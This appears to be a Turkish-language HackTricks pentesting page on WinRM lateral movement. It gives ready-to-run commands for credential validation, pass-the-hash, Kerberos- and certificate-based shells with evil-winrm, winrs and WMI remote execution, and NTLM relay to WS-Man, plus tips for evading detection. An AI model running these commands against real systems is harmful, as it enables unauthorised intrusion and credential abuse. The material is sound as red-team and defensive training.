# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM, Windows ortamlarında en kullanışlı **lateral movement** taşımalarından biridir; çünkü SMB service creation hilelerine ihtiyaç duymadan **WS-Man/HTTP(S)** üzerinden uzaktan shell verir. Hedef **5985/5986** portlarını açıyorsa ve principal’in remoting kullanmasına izin veriliyorsa, çoğu zaman "valid creds"ten "interactive shell"e çok hızlı geçebilirsiniz.

**protocol/service enumeration**, listeners, WinRM’yi enable etme, `Invoke-Command` ve genel client kullanımı için şunlara bakın:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Neden operatörler WinRM'yi sever

- **SMB/RPC** yerine **HTTP/HTTPS** kullanır; bu yüzden çoğu zaman PsExec-style execution engellendiği yerlerde çalışır.
- **Kerberos** ile, yeniden kullanılabilir credentials’ı hedefe göndermeyi önler.
- **Windows**, **Linux** ve **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) ile temiz şekilde çalışır.
- Interactive PowerShell remoting yolu, hedefte authenticated user context altında **`wsmprovhost.exe`** başlatır; bu, service-based exec'ten operasyonel olarak farklıdır.

## Access modeli ve prerequisites

Pratikte başarılı WinRM lateral movement, **üç** şeye bağlıdır:

1. Hedefte erişime izin veren bir **WinRM listener** (`5985`/`5986`) ve firewall kuralları vardır.
2. Account endpoint’e **authenticate** olabilir.
3. Account bir remoting session açmaya **izinlidir**.

Bu erişimi kazanmanın yaygın yolları:

- Hedefte **Local Administrator** olmak.
- Yeni sistemlerde **Remote Management Users** üyeliği veya hâlâ o grubu tanıyan sistem/bileşenlerde **WinRMRemoteWMIUsers__** üyeliği.
- Local security descriptors / PowerShell remoting ACL değişiklikleri üzerinden açıkça devredilmiş remoting yetkileri.

Eğer zaten admin rights ile bir box kontrol ediyorsanız, burada anlatılan teknikleri kullanarak tam admin group membership olmadan da **WinRM access delegate** edebileceğinizi unutmayın:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement sırasında önemli authentication gotchas

- **Kerberos hostname/FQDN gerektirir**. IP ile bağlanırsanız client genelde **NTLM/Negotiate**'a düşer.
- **workgroup** veya cross-trust edge case'lerde, NTLM genelde ya **HTTPS** ister ya da hedefin client üzerinde **TrustedHosts** listesine eklenmesini ister.
- Workgroup içinde Negotiate üzerinden **local accounts** kullanırken, built-in Administrator account kullanılmadıkça veya `LocalAccountTokenFilterPolicy=1` yapılmadıkça UAC remote restrictions erişimi engelleyebilir.
- PowerShell remoting varsayılan olarak **`HTTP/<host>`** SPN'ini kullanır. **`HTTP/<host>`** zaten başka bir service account’a kayıtlıysa, WinRM Kerberos **`0x80090322`** ile başarısız olabilir; port-qualified SPN kullanın veya bu SPN'in bulunduğu yerlerde **`WSMAN/<host>`**'a geçin.

Password spraying sırasında valid credentials ele geçirirseniz, bunların shell’e dönüşüp dönüşmediğini kontrol etmenin en hızlı yolu çoğu zaman onları WinRM üzerinden doğrulamaktır:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec ile validation ve tek atımlık execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Interaktif shell’ler için Evil-WinRM

`evil-winrm`, **parolaları**, **NT hash’lerini**, **Kerberos ticket’larını**, **client certificate’larını**, dosya transferini ve in-memory PowerShell/.NET loading’i desteklediği için Linux’tan en kullanışlı interaktif seçenektir.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Varsayılan **`HTTP/<host>`** SPN Kerberos başarısızlıklarına neden olduğunda, bunun yerine **`WSMAN/<host>`** ticket istemeyi/kullanmayı deneyin. Bu durum, **`HTTP/<host>`** zaten başka bir service account’a bağlı olduğu hardened veya sıra dışı enterprise kurulumlarda görülür.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Bu ayrıca, özellikle genel bir `HTTP` ticket yerine **WSMAN** service ticket forge ettiğiniz veya istediğiniz durumlarda, **RBCD / S4U** abuse sonrasında da kullanışlıdır.

### Certificate-based authentication

WinRM ayrıca **client certificate authentication** destekler, ancak certificate hedefte bir **local account** ile eşleştirilmiş olmalıdır. Offensive perspective açısından bu şu durumlarda önemlidir:

- WinRM için zaten eşleştirilmiş geçerli bir client certificate ve private key’i steal/export ettiyseniz;
- bir principal için certificate almak ve ardından başka bir authentication path’e pivot etmek için **AD CS / Pass-the-Certificate** abuse ettiyseniz;
- password-based remoting’i bilinçli olarak kullanmayan ortamlarda çalışıyorsanız.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM, password/hash/Kerberos auth’a göre çok daha az yaygındır, ancak mevcut olduğunda password rotation’dan bağımsız bir **passwordless lateral movement** yolu sağlayabilir.

### Python / automation with `pypsrp`

Bir operator shell yerine automation gerekiyorsa, `pypsrp` Python’dan WinRM/PSRP sağlar ve **NTLM**, **certificate auth**, **Kerberos** ve **CredSSP** desteği sunar.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` yerleşik olarak gelir ve etkileşimli bir PowerShell remoting oturumu açmadan **native WinRM command execution** yapmak istediğinizde kullanışlıdır:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operasyonel olarak, `winrs.exe` genellikle şu benzer bir uzak süreç zinciriyle sonuçlanır:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Bu hatırlanmaya değer çünkü service-based exec ve interactive PSRP sessions ile farklıdır.

### `winrm.cmd` / PowerShell remoting yerine WS-Man COM

Ayrıca `Enter-PSSession` kullanmadan **WinRM transport** üzerinden, WS-Man üstünde WMI sınıflarını çağırarak da execute edebilirsiniz. Bu, transport’u WinRM olarak tutar ancak remote execution primitive **WMI `Win32_Process.Create`** olur:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Bu yaklaşım şu durumlarda faydalıdır:

- PowerShell logging yoğun şekilde izleniyorsa.
- Klasik bir PS remoting workflow’u değil de **WinRM transport** istiyorsanız.
- **`WSMan.Automation`** COM object etrafında custom tooling geliştiriyor veya kullanıyorsanız.

## NTLM relay to WinRM (WS-Man)

SMB relay signing ile engellendiğinde ve LDAP relay kısıtlandığında, **WS-Man/WinRM** hâlâ cazip bir relay target olabilir. Modern `ntlmrelayx.py` içinde **WinRM relay servers** bulunur ve **`wsman://`** veya **`winrms://`** target’larına relay yapabilir.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
İki pratik not:

- Relay, hedef **NTLM** kabul ettiğinde ve relayed principal WinRM kullanmaya yetkili olduğunda en faydalıdır.
- Son Impacket kodu özellikle **`WSMANIDENTIFY: unauthenticated`** isteklerini işler; böylece **Test-WSMan** tarzı denemeler relay akışını bozmaz.

İlk WinRM oturumunu aldıktan sonra multi-hop kısıtlamaları için şunlara bakın:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC ve detection notları

- **Interactive PowerShell remoting** genellikle hedefte **`wsmprovhost.exe`** oluşturur.
- **`winrs.exe`** çoğunlukla **`winrshost.exe`** ve ardından istenen child process’i oluşturur.
- **PSRP** kullanırsanız, ham **`cmd.exe`** yerine **network logon** telemetry’si, WinRM service event’leri ve PowerShell operational/script-block logging bekleyin.
- Sadece tek bir komut gerekiyorsa, **`winrs.exe`** veya tek atımlık WinRM execution, uzun süreli interactive remoting session’dan daha sessiz olabilir.
- Kerberos kullanılabiliyorsa, hem trust sorunlarını hem de istemci tarafındaki garip **`TrustedHosts`** değişikliklerini azaltmak için IP + NTLM yerine **FQDN + Kerberos** tercih edin.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
